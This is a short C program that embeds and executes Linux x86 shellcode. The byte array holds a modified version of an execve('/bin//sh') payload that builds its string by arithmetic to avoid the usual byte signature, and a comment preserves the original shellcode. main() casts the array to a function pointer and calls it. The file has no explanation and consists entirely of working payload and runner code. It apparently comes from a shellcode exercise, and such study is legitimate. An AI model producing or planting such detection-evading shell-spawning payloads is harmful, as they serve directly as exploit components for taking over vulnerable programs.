#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xdb\x89\xd8\x53\xb8\x97\x97\x39\x34\x05\x98\x97\x39\x34\x50\x05\x01\x33\xf6\x05\x83\xe8\x01\x50\x89\xd9\x89\xda\x89\xd8\x89\xe3\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80";

/*
Original shell code
"\x31\xc0\x50\x68\x2f\x2f\x73"
"\x68\x68\x2f\x62\x69\x6e\x89"
"\xe3\x89\xc1\x89\xc2\xb0\x0b"
"\xcd\x80\x31\xc0\x40\xcd\x80";
*/
main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	
